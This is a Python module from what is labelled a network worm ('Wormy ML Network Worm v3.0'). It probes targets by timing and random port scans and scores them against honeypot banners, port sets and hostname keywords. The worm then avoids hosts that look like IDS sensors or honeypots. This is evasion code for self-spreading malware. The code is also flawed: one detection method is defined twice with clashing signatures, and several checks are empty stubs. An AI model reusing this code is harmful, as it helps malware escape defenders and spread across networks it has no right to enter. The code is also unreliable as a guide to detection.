"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
IDS/IPS Detection Module
Detects presence of intrusion detection systems and honeypots
"""


import os
import random
import sys
import time
from collections import defaultdict
from typing import Dict, List, Optional, Tuple

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.logger import logger
from utils.network_utils import port_scan, tcp_ping


class IDSDetector:
    """Detects IDS/IPS and honeypots"""

    def __init__(self, config):
        self.config = config
        self.detected_ids = set()
        self.suspected_honeypots = set()
        self.response_times = defaultdict(list)

        logger.info("IDS Detector initialized")

    def detect_ids(self, target: str) -> Tuple[bool, float]:
        """
        Detect if target or network has IDS/IPS

        Returns:
            (ids_detected, confidence)
        """
        logger.debug(f"IDS Detection: Checking {target}")

        indicators = []

        # 1. Response time analysis
        timing_anomaly = self._check_timing_anomalies(target)
        if timing_anomaly:
            indicators.append(("timing", 0.6))

        # 2. Port scan detection
        scan_response = self._check_scan_response(target)
        if scan_response:
            indicators.append(("scan_response", 0.7))

        # 3. Honeypot signatures
        is_honeypot = self._check_honeypot_signatures(target)
        if is_honeypot:
            indicators.append(("honeypot", 0.9))

        # 4. Traffic pattern analysis
        pattern_anomaly = self._check_traffic_patterns(target)
        if pattern_anomaly:
            indicators.append(("traffic", 0.5))

        # Calculate confidence
        if not indicators:
            return False, 0.0

        # Weighted average
        total_weight = sum(conf for _, conf in indicators)
        confidence = total_weight / len(indicators)

        ids_detected = confidence > 0.5

        if ids_detected:
            self.detected_ids.add(target)
            logger.warning(
                f"IDS Detection: IDS/IPS detected on {target} (confidence: {confidence:.2f})"
            )
            logger.log_evasion(
                "IDS_Detection",
                f"Detected on {target}",
                {
                    "target": target,
                    "confidence": confidence,
                    "indicators": [ind for ind, _ in indicators],
                },
            )

        return ids_detected, confidence

    def _check_timing_anomalies(self, target: str) -> bool:
        """
        Check for timing anomalies that indicate IDS

        IDS often introduces consistent delays
        """
        # Measure response times
        times = []
        for _ in range(5):
            start = time.time()
            tcp_ping(target, port=80, timeout=2)
            elapsed = time.time() - start
            times.append(elapsed)
            time.sleep(0.1)

        self.response_times[target].extend(times)

        # Check for suspicious consistency
        if len(times) >= 3:
            avg_time = sum(times) / len(times)
            variance = sum((t - avg_time) ** 2 for t in times) / len(times)

            # Very low variance might indicate IDS
            if variance < 0.001 and avg_time > 0.1:
                return True

        return False

    def _check_scan_response(self, target: str) -> bool:
        """
        Check how target responds to port scans

        IDS might:
        - Show all ports as open (tarpit)
        - Show all ports as closed
        - Respond with RST packets immediately
        """
        # Quick scan of random ports
        test_ports = random.sample(range(1024, 65535), 10)
        open_ports = port_scan(target, test_ports, timeout=1)

        # Suspicious: All ports open
        if len(open_ports) == len(test_ports):
            logger.warning(f"IDS Detection: All ports open on {target} (tarpit?)")
            return True

        # Suspicious: All ports respond identically
        if len(open_ports) == 0:
            # Could be firewall or IDS
            return False

        return False

    def _check_honeypot_signatures(self, target: str) -> bool:
        """
        Check for honeypot signatures

        Honeypots often have:
        - Too many services
        - Unusual service combinations
        - Fake banners
        - Suspicious hostnames
        """
        # This would be enhanced with real scan data
        # For now, use heuristics

        # Check if target is in known honeypot ranges
        # (In real implementation, maintain honeypot database)

        return False

    def _check_traffic_patterns(self, target: str) -> bool:
        """
        Analyze traffic patterns for IDS indicators

        IDS might:
        - Mirror traffic
        - Inject packets
        - Reset connections
        """
        # Simplified check
        return False

    def is_honeypot(self, target: str, scan_result: Dict) -> Tuple[bool, float]:
        """
        Determine if target is a honeypot using anomaly scoring

        Indicators:
        - Too many open ports (>15)
        - Unusual service combinations
        - Fake/suspicious banners
        - Response time too consistent (simulated)
        - All ports responding identically
        - Known honeypot port patterns
        - Hostname anomalies
        """
        logger.debug(f"Honeypot Detection: Checking {target}")

        indicators = []

        # 1. Too many open ports (honeypots expose everything)
        open_ports = scan_result.get("open_ports", [])
        if len(open_ports) > 15:
            indicators.append(("too_many_ports", 0.7))
        elif len(open_ports) > 10:
            indicators.append(("many_ports", 0.4))

        # 2. Unusual service combinations
        if self._has_unusual_services(open_ports):
            indicators.append(("unusual_services", 0.6))

        # 3. Fake banners
        banners = scan_result.get("banners", {})
        if self._has_fake_banners(banners):
            indicators.append(("fake_banners", 0.8))

        # 4. Known honeypot signatures
        if self._check_honeypot_signatures(open_ports, banners):
            indicators.append(("honeypot_signature", 0.9))

        # 5. Response time analysis
        if target in self.response_times:
            times = self.response_times[target]
            if len(times) > 5:
                mean_t = sum(times) / len(times)
                variance = sum((t - mean_t) ** 2 for t in times) / len(times)
                if variance < 0.0001:
                    indicators.append(("timing_too_consistent", 0.5))
                if mean_t < 0.001:
                    indicators.append(("timing_too_fast", 0.4))

        # 6. Port pattern analysis
        honeypot_patterns = [
            {21, 22, 23, 25, 53, 80, 110, 135, 139, 443, 445, 3306, 3389, 5432, 8080},
            {21, 22, 23, 80, 443, 445, 3389, 8080, 8443},
        ]
        port_set = set(open_ports)
        for pattern in honeypot_patterns:
            if pattern.issubset(port_set):
                indicators.append(("honeypot_port_pattern", 0.85))
                break

        # 7. Hostname analysis
        hostname = scan_result.get("hostname", "")
        if hostname and any(
            x in hostname.lower() for x in ["honeypot", "honey", "trap", "canary", "test", "demo"]
        ):
            indicators.append(("suspicious_hostname", 0.95))

        # Calculate weighted confidence
        if not indicators:
            return False, 0.0

        weights = [0.15, 0.1, 0.15, 0.2, 0.1, 0.15, 0.15]
        weighted_score = 0
        total_weight = 0
        for i, (_, conf) in enumerate(indicators):
            w = weights[min(i, len(weights) - 1)]
            weighted_score += w * conf
            total_weight += w

        confidence = weighted_score / total_weight if total_weight > 0 else 0
        is_honeypot = confidence > 0.55

        if is_honeypot:
            self.suspected_honeypots.add(target)
            logger.warning(f"Honeypot detected: {target} (confidence: {confidence:.2f})")
            logger.log_evasion(
                "Honeypot_Detection",
                f"Detected at {target}",
                {
                    "target": target,
                    "confidence": confidence,
                    "indicators": [ind for ind, _ in indicators],
                },
            )

        return is_honeypot, confidence

    def _check_honeypot_signatures(self, ports: List[int], banners: Dict) -> bool:
        """Check for known honeypot software signatures"""
        honeypot_signatures = [
            "kippo",
            "cowrie",
            "dionaea",
            "glastopf",
            "honeyd",
            "conpot",
            "amun",
            "mwcollect",
            "shockpot",
        ]
        for banner in banners.values():
            banner_lower = banner.lower()
            if any(sig in banner_lower for sig in honeypot_signatures):
                return True
        return False

    def _has_unusual_services(self, ports: List[int]) -> bool:
        """Check for unusual service combinations"""
        # Honeypots often run many services that wouldn't normally coexist

        # Check for conflicting services
        has_windows_services = any(p in ports for p in [135, 139, 445, 3389])
        has_linux_services = any(p in ports for p in [22])

        # Suspicious if both Windows and Linux services
        if has_windows_services and has_linux_services:
            return True

        # Check for too many database ports
        db_ports = [1433, 3306, 5432, 27017, 6379]
        db_count = sum(1 for p in db_ports if p in ports)
        if db_count > 2:
            return True

        return False

    def _has_fake_banners(self, banners: Dict[int, str]) -> bool:
        """Check for fake or suspicious banners"""
        for port, banner in banners.items():
            if not banner:
                continue

            banner_lower = banner.lower()

            # Check for generic/fake banners
            if any(fake in banner_lower for fake in ["honeypot", "fake", "test", "dummy"]):
                return True

            # Check for version mismatches
            # (Real implementation would have more sophisticated checks)

        return False

    def should_avoid_target(self, target: str, scan_result: Dict = None) -> bool:
        """
        Determine if target should be avoided

        Args:
            target: IP address
            scan_result: Optional scan results

        Returns:
            True if target should be avoided
        """
        # Check if already detected as IDS
        if target in self.detected_ids:
            return True

        # Check if suspected honeypot
        if target in self.suspected_honeypots:
            return True

        # Run detection if scan result provided
        if scan_result:
            is_honeypot, confidence = self.is_honeypot(target, scan_result)
            if is_honeypot and confidence > 0.7:
                return True

        return False

    def get_statistics(self) -> Dict:
        """Get detection statistics"""
        return {
            "detected_ids": len(self.detected_ids),
            "suspected_honeypots": len(self.suspected_honeypots),
            "ids_list": list(self.detected_ids),
            "honeypot_list": list(self.suspected_honeypots),
        }


if __name__ == "__main__":
    import os
    import sys

    sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    try:
        from configs.config import Config
    except ImportError:
        from config import Config

    config = Config()
    detector = IDSDetector(config)

    # Test IDS detection
    test_target = "192.168.1.100"
    ids_detected, confidence = detector.detect_ids(test_target)
    print(f"IDS Detected: {ids_detected} (confidence: {confidence:.2f})")

    # Test honeypot detection
    test_scan = {
        "ip": "192.168.1.200",
        "open_ports": [21, 22, 23, 25, 80, 110, 135, 139, 443, 445, 1433, 3306, 3389, 5432, 8080],
        "banners": {80: "Apache/2.4.41 (Ubuntu)"},
        "response_time": 50.0,
    }

    is_honeypot, confidence = detector.is_honeypot(test_scan["ip"], test_scan)
    print(f"\nHoneypot Detected: {is_honeypot} (confidence: {confidence:.2f})")

    print(f"\nStatistics: {detector.get_statistics()}")
